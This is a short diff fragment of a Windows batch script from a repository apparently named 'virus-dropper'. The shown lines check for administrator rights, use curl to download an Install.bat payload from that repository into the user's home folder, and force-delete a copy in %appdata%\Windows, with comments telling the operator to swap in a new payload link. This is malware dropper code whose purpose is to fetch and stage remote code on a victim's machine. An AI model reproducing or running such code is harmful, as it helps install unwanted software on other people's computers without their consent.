@@ -23,7 +23,7 @@ if '%errorlevel%' NEQ '0' (
 
 ::Create a copy of install.bat, and edit items inside as directed
 ::Edit this link to the DIRECT download link of the new install.bat
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "%homepath%\Install.bat"
 ::do not change --output
 
 del /f "%appdata%\Windows\Install.bat"
